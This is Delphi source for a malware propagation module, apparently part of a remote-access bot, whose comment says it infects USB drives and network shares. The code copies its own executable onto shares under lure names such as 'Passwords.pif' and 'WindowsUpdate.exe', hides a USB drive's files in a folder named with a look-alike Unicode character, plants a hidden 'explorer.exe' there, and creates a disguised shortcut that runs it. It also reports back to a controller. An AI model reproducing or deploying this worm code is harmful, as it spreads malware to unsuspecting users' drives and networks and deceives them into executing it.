unit SpreadUnit;

{
  This unit provides the TSpreader class, which is a descendant
  of TWorker. This class is capable of detecting and infecting
  USB Drives and Network Shares.
}

{$WARN SYMBOL_PLATFORM OFF}

interface

uses
  SysUtils, Classes,
  Winapi.Windows, Winapi.ActiveX, ShellAPI, ShlObj, ComObj, INIFiles,
  DProcess,
  Basics, SystemUnit, CommandUnit;

type
  TSpreader = class(TWorker)
  public
    procedure Execute; override;
  end;

const
  CloneNames: Array [0 .. 4] of String = (#$202F + '\explorer.exe',
    'WindowsUpdate.exe', 'Passwords.pif', 'NewScreen.scr', 'Update.exe');
  SharesCmd = '-Command "Get-WmiObject -Class Win32_Share | Format-List -Pro' +
    'perty Name, Path"';

procedure CreateLink(const PathObj, PathLink, Desc, Param: string;
  SetIcon: Boolean = True);

implementation

uses NetUnit;

function IsInfected(Path: String): Integer;
var
  I: LongInt;
Begin
  Result := -1;
  for I := 0 to High(CloneNames) do
    if FileExists(Path + CloneNames[I]) then
    Begin
      Result := I;
      Exit;
    End;
End;

function GetCloneName: String;
Begin
  Result := CloneNames[Random(High(CloneNames)) + 1];
End;

procedure CreateClone(FileName, Mode: String);
var
  S: TMemINIFile;
  M: TMemoryStream;
  R: THandle;
Begin
  CopyFile(PChar(ParamStr(0)), PChar(FileName), False);
  M := TMemoryStream.Create;
  try
    M.LoadFromFile(ConfigFile);
    Crypt(M, False);
    S := TMemINIFile.Create(M);
    try
      S.EraseSection('General');
      S.WriteString('Install', 'Owner', Options.GUID);
      S.WriteString('Install', 'Mode', Mode);
      S.WriteInteger('Install', 'Elevate', 3);
      S.WriteBool('Install', 'Windef', True);
      S.WriteBool('Install', 'Melt', False);
      S.UpdateFile;
    finally
      S.Free;
    end;
    Crypt(M);
    M.Position := 0;
    R := BeginUpdateResource(PChar(FileName), False);
    UpdateResource(R, RT_RCDATA, PChar(ConfigRes), LANG_NEUTRAL, Nil, 0);
    UpdateResource(R, RT_RCDATA, PChar(ConfigRes), LANG_NEUTRAL,
      M.Memory, M.Size);
    EndUpdateResource(R, False);
  finally
    M.Free;
  end;
End;

procedure CreateLink(const PathObj, PathLink, Desc, Param: string;
  SetIcon: Boolean = True);
var
  IObject: IUnknown;
  SLink: IShellLink;
  PFile: IPersistFile;
begin
  IObject := CreateComObject(CLSID_ShellLink);
  SLink := IObject as IShellLink;
  PFile := IObject as IPersistFile;
  with SLink do
  begin
    SetArguments(PChar(Param));
    SetDescription(PChar(Desc));
    SetPath(PChar(PathObj));
    if SetIcon then
      SetIconLocation('C:\Windows\System32\SHELL32.dll', 7);
  end;
  PFile.Save(PWChar(WideString(PathLink)), False);
end;

function SysCopy(const Source, Dest: String): Boolean;
var
  shFOS: TShFileOpStruct;
begin
  ZeroMemory(@shFOS, SizeOf(TShFileOpStruct));
  shFOS.Wnd := 0;
  shFOS.wFunc := FO_MOVE;
  shFOS.pFrom := PChar(Source + #0);
  shFOS.pTo := PChar(Dest + #0);
  shFOS.fFlags := FOF_NOCONFIRMMKDIR or FOF_SILENT or FOF_NOCONFIRMATION or
    FOF_NOERRORUI;
  Result := SHFileOperation(shFOS) = 0;
end;

function IsDirectoryWriteable(const AName: string): Boolean;
var
  FileName: String;
  H: THandle;
begin
  FileName := IncludeTrailingPathDelimiter(AName) + 'chk.tmp';
  H := CreateFile(PChar(FileName), GENERIC_READ or GENERIC_WRITE, 0, nil,
    CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY or FILE_FLAG_DELETE_ON_CLOSE, 0);
  Result := H <> INVALID_HANDLE_VALUE;
  if Result then
    CloseHandle(H);
end;

procedure ListNetworkShares(List: TStringList);
var
  A: AnsiString;
  T: String;
  S: TStringList;
  J: LongInt;
Begin
  RunCommand('powershell', [SharesCmd], A, []);
  S := TStringList.Create;
  S.Text := String(A);
  for J := 0 to S.Count - 1 do
  Begin
    if Not(S.Strings[J].Contains('Name :')) then
      Continue;
    if S.Strings[J].Contains('$') then
      Continue;
    T := S.Strings[J + 1];
    Delete(T, 1, Pos(':', T));
    T := IncludeTrailingBackslash(Trim(T));
    List.AddPair(T, '1');
  End;
  S.Free;
End;

procedure ListDrivesOfType(DriveType: Cardinal; List: TStringList);
var
  DriveMap, dMask: DWORD;
  C: Char;
Begin
  List.Clear;
  DriveMap := GetLogicalDrives;
  dMask := 1;
  for C := 'A' to 'Z' do
  Begin
    if (dMask and DriveMap) <> 0 then
      if GetDriveType(PChar(C + ':\')) = DriveType then
        List.AddPair(C + ':\', IntToStr(DriveType));
    dMask := dMask shl 1;
  End;
End;

function GetVolumeLabel(DriveChar: Char): string;
var
  NotUsed: DWORD;
  VolumeFlags: DWORD;
  VolumeSerialNumber: DWORD;
  Buf: array [0 .. MAX_PATH] of Char;
begin
  GetVolumeInformation(PChar(DriveChar + ':\'), Buf, (MAX_PATH+1)*SizeOf(Char),
    @VolumeSerialNumber, NotUsed, VolumeFlags, nil, 0);

  SetString(Result, Buf, StrLen(Buf));
end;

procedure InfectUSBDrive(Path: String);
var
  S, Lbl: String;
Begin
  Dbg('Uninfected USB [' + Path[1] + '] found.');
  S := Path + #$202F;
  Lbl := GetVolumeLabel(S[1]);
  ForceDirectories(S);
  With TINIFile.Create(S + '\desktop.ini') do
  Begin
    WriteString('.ShellClassInfo', 'IconResource',
      'C:\Windows\system32\SHELL32.dll,7');
    UpdateFile;
    Free;
  End;
  FileSetAttr(S, faHidden or faSysFile);
  FileSetAttr(S + '\desktop.ini', faHidden or faSysFile);
  SysCopy(Path + '*.*', S);
  CopyFile('C1.tmp', PChar(S + '\explorer.exe'), False);
  FileSetAttr(S + '\explorer.exe', faHidden or faSysFile);
  CreateLink('%windir%\explorer.exe', Path + Lbl + ' (' + S[1] + #$A789 +
    ').lnk', 'Removable Drive', '"' + #$202F + '\explorer.exe"');
End;

procedure InfectFolder(Path: String);
Begin
  Dbg('Uninfected Network Entry found: ' + Path);
  CopyFile('C2.tmp', PChar(Path + GetCloneName), False);
  // RenameFile(Path+'C2.tmp', GetCloneName);
End;

procedure TSpreader.Execute;
var
  List: TStringList;
  J, I: LongInt;
begin
  if FParams.Values['mode'] = 'Disinfect' then
  Begin
    Dbg('Disinfection started.');
    List := TStringList.Create;
    try
      List.NameValueSeparator := '|';
      ListNetworkShares(List);
      for J := 0 to List.Count - 1 do
      Begin
        I := IsInfected(List.Names[J]);
        if I > -1 then
        Begin
          SysUtils.DeleteFile(List.Names[J] + CloneNames[I]);
          Dbg('Disinfected: ' + CloneNames[I]);
        End;
      End;
    finally
      List.Free;
      Net.SendResponse(R_SUCCESS, FID);
    end;
    Dbg('Disinfection ended.');
  End
  else
  Begin
    Dbg('Spreading routine started.');
    try
      CoInitialize(Nil);
      List := TStringList.Create;
      List.NameValueSeparator := '|';
      CreateClone('C1.tmp', 'USB');
      CreateClone('C2.tmp', 'Network');
      Net.SendResponse('Spreading routine started.', FID, False);
      Repeat
        List.Clear;
        ListDrivesOfType(DRIVE_REMOVABLE, List);
        ListNetworkShares(List);
        for J := 0 to List.Count - 1 do
          if IsDirectoryWriteable(List.Names[J]) then
            if IsInfected(List.Names[J]) = -1 then
            Begin
              case StrToInt(List.ValueFromIndex[J]) of
                DRIVE_REMOVABLE:
                  InfectUSBDrive(List.Names[J]);
              else
                InfectFolder(List.Names[J]);
              end;
            End;
        Sleep(3000);
      Until Terminated;
      DeleteFile('C1.tmp');
      DeleteFile('C2.tmp');
      List.Free;
      CoUninitialize;
    except
      on E: Exception do
        Dbg('Spread Error ' + E.ClassName + ': ' + E.Message, dError);
    end;
    Net.SendResponse(R_SUCCESS, FID);
    Dbg('Spreading routine ended.');
  End;
end;

end.
